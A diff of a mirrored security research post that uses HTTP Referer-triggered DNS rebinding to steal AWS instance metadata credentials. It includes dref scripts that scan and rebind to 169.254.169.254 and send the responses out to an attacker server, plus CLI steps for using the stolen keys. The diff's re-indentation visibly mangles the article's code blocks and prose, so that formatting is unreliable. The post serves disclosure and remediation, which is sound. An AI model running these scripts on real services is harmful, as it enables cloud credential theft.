@@ -16,7 +16,7 @@ This article describes the use of HTTP Referer headers to execute DNS rebinding 
 
 I originally published this on the [MWR Labs blog](https://labs.mwrinfosecurity.com/blog/from-http-referer-to-aws-security-credentials/). It is reproduced here as a mirror.
 
-This research got nominated (not by me!) for PortSwigger's [top 10 web hacking techniques of 2018](https://portswigger.net/research/top-10-web-hacking-techniques-of-2018-nominations-open) and received a shoutout from [James Kettle on Twitter](https://twitter.com/albinowax/status/1036592199155310593/retweets/with_comments) and a [mention in the following year's 3rd best web hacking technique](https://portswigger.net/research/top-10-web-hacking-techniques-of-2019).
+This research got nominated (not by me!) for PortSwigger's [top 10 web hacking techniques of 2018](https://portswigger.net/research/top-10-web-hacking-techniques-of-2018-nominations-open) and received a shoutout from [James Kettle on Twitter](https://twitter.com/albinowax/status/1036592199155310593) and a [mention in the following year's 3rd best web hacking technique](https://portswigger.net/research/top-10-web-hacking-techniques-of-2019).
 
 ## Introduction
 
@@ -57,13 +57,13 @@ The ability to cause a browser to hang was added as a configuration key to _dref
 ```javascript
 // fetch an image that will never fully load
 router.get("/hang.png", function (req, res, next) {
-  res
-    .status(200)
-    .set({
-      "Content-Length": "1",
-    })
-    .send();
-});
+        res
+        .status(200)
+        .set({
+                "Content-Length": "1",
+                })
+        .send();
+        });
 ```
 
 With these measures in place, an attacker would have up to four minutes of JavaScript code execution in the browsers.
@@ -84,9 +84,9 @@ const session = new Session();
 const netmap = new NetMap();
 
 function main() {
-  netmap.tcpScan(["169.254.169.254"], [80, 1234, 4444]).then((results) => {
-    session.log(results);
-  });
+    netmap.tcpScan(["169.254.169.254"], [80, 1234, 4444]).then((results) => {
+            session.log(results);
+            });
 }
 
 main();
@@ -98,15 +98,15 @@ The results clearly indicated that port 80 was open and reachable:
 
 ```json
 "hosts": [
-  {
+{
     "host": "169.254.169.254",
-    "ports": [
+        "ports": [
         {"port": 80, "delta": 11, "open": true},
         {"port": 1234, "delta": 1000, "open": false},
         {"port": 4444, "delta": 1001, "open": false}
-    ],
-    "control": 1001
-  }
+        ],
+        "control": 1001
+}
 ]
 ```
 
@@ -129,18 +129,18 @@ import Session from "../libs/session";
 const session = new Session();
 
 async function main() {
-  // configure the A record to point to the AWS metadata endpoint when triggered
-  network.postJSON(session.baseURL + "/arecords", {
-    domain: window.env.target + "." + window.env.domain,
-    address: "169.254.169.254",
-  });
+    // configure the A record to point to the AWS metadata endpoint when triggered
+    network.postJSON(session.baseURL + "/arecords", {
+domain: window.env.target + "." + window.env.domain,
+address: "169.254.169.254",
+});
 
-  session.triggerRebind().then(() => {
-    // exfiltrate the response from the provided args.path argument
-    network.get(session.baseURL + window.args.path, (code, headers, body) => {
-      session.log({ code: code, headers: headers, body: body });
-    });
-  });
+session.triggerRebind().then(() => {
+        // exfiltrate the response from the provided args.path argument
+        network.get(session.baseURL + window.args.path, (code, headers, body) => {
+                session.log({ code: code, headers: headers, body: body });
+                });
+        });
 }
 
 main();
@@ -154,92 +154,92 @@ Requesting the `/latest/user-data/` path will return information the developers 
 
 ```json
 "data": {
-  "code": 200,
-  "body": "
-#!/bin/bash -xe
-echo 'KUBE_AWS_STACK_NAME=acme-prod-Nodeasgspotpool2-AAAAAAAAAAAA' >> /etc/environment
-
-[...]
-
-run bash -c \"aws s3 --region $REGION cp s3://acme-kube-prod-978bf8d902cab3b72271abf554bb539c/kube-aws/clusters/acme-prod/exported/stacks/node-asg-spotpool2/userdata-worker-4d3482495353ecdc0b088d42510267be8160c26bff0577915f5aa2a435077e5a /var/run/coreos/$USERDATA_FILE\"
-
-[...]
-
-exec /usr/bin/coreos-cloudinit --from-file /var/run/coreos/$USERDATA_FILE
-  "
-```
-
-In addition to listing an S3 bucket, the output reveals the service is running on Kubernetes, using Amazon's Auto-Scaling Group (ASG) and Spot Instances. The use of Kubernetes possibly offers other paths to exploitation that were not explored during this research.
-
-The main trophy from interaction with the endpoint is the temporary security credentials. A list of available security credentials can be obtained from the `/latest/meta-data/iam/security-credentials/` path:
-
-```json
-"data": {
     "code": 200,
-    "body": "eu-north-1-role.kube.nodes.asgspot2"
-}
-```
+        "body": "
+#!/bin/bash -xe
+            echo 'KUBE_AWS_STACK_NAME=acme-prod-Nodeasgspotpool2-AAAAAAAAAAAA' >> /etc/environment
 
-These credentials can be obtained by requesting `/latest/meta-data/iam/security-credentials/eu-north-1-role.kube.nodes.asgspot2`:
+            [...]
 
-```json
-"data": {
-  "code": 200,
-  "body": "
-\"Code\" : \"Success\",
-\"LastUpdated\" : \"2018-08-05T15:33:26Z\",
-\"Type\" : \"AWS-HMAC\",
-\"AccessKeyId\" : \"AKIAI44QH8DHBEXAMPLE\",
-\"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",
-\"Token\" : \"AQoDYXdzEJr[....]\",
-\"Expiration\" : \"2018-08-05T22:00:54Z\"
-  "
-}"
-```
+            run bash -c \"aws s3 --region $REGION cp s3://acme-kube-prod-978bf8d902cab3b72271abf554bb539c/kube-aws/clusters/acme-prod/exported/stacks/node-asg-spotpool2/userdata-worker-4d3482495353ecdc0b088d42510267be8160c26bff0577915f5aa2a435077e5a /var/run/coreos/$USERDATA_FILE\"
 
-These can then be used to authenticate to the AWS API:
+                [...]
 
-```
-$ export AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
-$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-$ export AWS_SESSION_TOKEN=AQoDYXdzEJr[...]
+                exec /usr/bin/coreos-cloudinit --from-file /var/run/coreos/$USERDATA_FILE
+                    "
+                    ```
 
-$ aws ec2 describe-instances
-[...]
-```
+                    In addition to listing an S3 bucket, the output reveals the service is running on Kubernetes, using Amazon's Auto-Scaling Group (ASG) and Spot Instances. The use of Kubernetes possibly offers other paths to exploitation that were not explored during this research.
 
-The extent of the impact is determined by the permissions granted with the credentials. This can range from complete compromise to information disclosure. Even with low privileges, attackers may be able to leverage such access to uncover additional attack paths or escalate their privileges.
+                    The main trophy from interaction with the endpoint is the temporary security credentials. A list of available security credentials can be obtained from the `/latest/meta-data/iam/security-credentials/` path:
+
+                    ```json
+                    "data": {
+                        "code": 200,
+                        "body": "eu-north-1-role.kube.nodes.asgspot2"
+                    }
+    ```
+
+        These credentials can be obtained by requesting `/latest/meta-data/iam/security-credentials/eu-north-1-role.kube.nodes.asgspot2`:
+
+        ```json
+        "data": {
+            "code": 200,
+                "body": "
+                    \"Code\" : \"Success\",
+                \"LastUpdated\" : \"2018-08-05T15:33:26Z\",
+                \"Type\" : \"AWS-HMAC\",
+                \"AccessKeyId\" : \"AKIAI44QH8DHBEXAMPLE\",
+                \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",
+                \"Token\" : \"AQoDYXdzEJr[....]\",
+                \"Expiration\" : \"2018-08-05T22:00:54Z\"
+                    "
+        }"
+    ```
+
+        These can then be used to authenticate to the AWS API:
+
+        ```
+        $ export AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
+        $ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+        $ export AWS_SESSION_TOKEN=AQoDYXdzEJr[...]
+
+        $ aws ec2 describe-instances
+        [...]
+        ```
+
+            The extent of the impact is determined by the permissions granted with the credentials. This can range from complete compromise to information disclosure. Even with low privileges, attackers may be able to leverage such access to uncover additional attack paths or escalate their privileges.
 
 ## Remediation
 
 ### AWS
 
-In AWS environments, measures should always be taken to prevent unintended interactions with the AWS metadata endpoint. As services may need to access the endpoint, a possible measure is to implement _iptables_ rules on the instances to limit traffic to root while ensuring that processes that interact with user input do not run as root.
+            In AWS environments, measures should always be taken to prevent unintended interactions with the AWS metadata endpoint. As services may need to access the endpoint, a possible measure is to implement _iptables_ rules on the instances to limit traffic to root while ensuring that processes that interact with user input do not run as root.
 
-This vector is not limited to attacking the AWS metadata endpoint as other network services may be exploitable. Firewall rules should be implemented accordingly.
+            This vector is not limited to attacking the AWS metadata endpoint as other network services may be exploitable. Firewall rules should be implemented accordingly.
 
-As always, the principle of least privilege also applies: security credentials should not offer more privileges than necessary.
+            As always, the principle of least privilege also applies: security credentials should not offer more privileges than necessary.
 
 ### DNS Rebinding
 
-In general, there is likely no adequate reason for external DNS answers to contain internal IP addresses. Where possible, such DNS answers should be dropped.
+            In general, there is likely no adequate reason for external DNS answers to contain internal IP addresses. Where possible, such DNS answers should be dropped.
 
-Services wrapped in SSL/TLS and services that validate the Host header are not affected by DNS rebinding.
+            Services wrapped in SSL/TLS and services that validate the Host header are not affected by DNS rebinding.
 
 ## Conclusion
 
-DNS rebinding was always understood to present a theoretical risk but has historically not been taken seriously. Traditional vectors that would be used to deliver the attack usually allow more direct means of exploiting victims.
+            DNS rebinding was always understood to present a theoretical risk but has historically not been taken seriously. Traditional vectors that would be used to deliver the attack usually allow more direct means of exploiting victims.
 
-However, this research has demonstrated the vectors are not limited to phishing and watering hole attacks. Any service that processes user-supplied URLs, whether directly or indirectly, may be at risk.
+            However, this research has demonstrated the vectors are not limited to phishing and watering hole attacks. Any service that processes user-supplied URLs, whether directly or indirectly, may be at risk.
 
-Engineers implementing such services should take into account the access they will be granting to untrusted scripts, and design the services accordingly.
+            Engineers implementing such services should take into account the access they will be granting to untrusted scripts, and design the services accordingly.
 
 ## Tools
 
-MWR's DNS rebinding framework dref can be found on [GitHub](https://github.com/mwrlabs/dref).
+            MWR's DNS rebinding framework dref can be found on [GitHub](https://github.com/mwrlabs/dref).
 
-The reson8 tool will be released shortly. The tool can be used by security professionals to detect web applications that will issue requests to URLs submitted in HTTP headers. reson8 is intended for testing large sets of URLs. For single test cases the author recommends PortSwigger's collaborator-everywhere.
+            The reson8 tool will be released shortly. The tool can be used by security professionals to detect web applications that will issue requests to URLs submitted in HTTP headers. reson8 is intended for testing large sets of URLs. For single test cases the author recommends PortSwigger's collaborator-everywhere.
 
 ## Thanks
 
-Thanks go to Markus Blechinger and Adam Williams at MWR for their insights and tips while conducting this research.
+            Thanks go to Markus Blechinger and Adam Williams at MWR for their insights and tips while conducting this research.
